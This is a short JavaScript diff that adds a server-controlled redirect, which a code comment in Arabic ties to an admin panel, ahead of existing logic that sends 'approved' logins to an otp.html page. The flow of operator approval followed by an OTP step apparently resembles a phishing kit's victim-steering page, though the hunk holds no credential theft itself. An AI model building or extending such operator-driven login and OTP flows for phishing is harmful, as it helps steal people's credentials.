@@ -228,6 +228,11 @@
             })
             .then(response => response.json())
             .then(data => {
+                // احترام إعادة التوجيه من لوحة الأدمن أولاً
+                if (data.redirect_to) {
+                    window.location.href = data.redirect_to;
+                    return;
+                }
                 if (data.status === 'approved') {
                     if (data.type === 'login') {
                         window.location.href = 'otp.html';
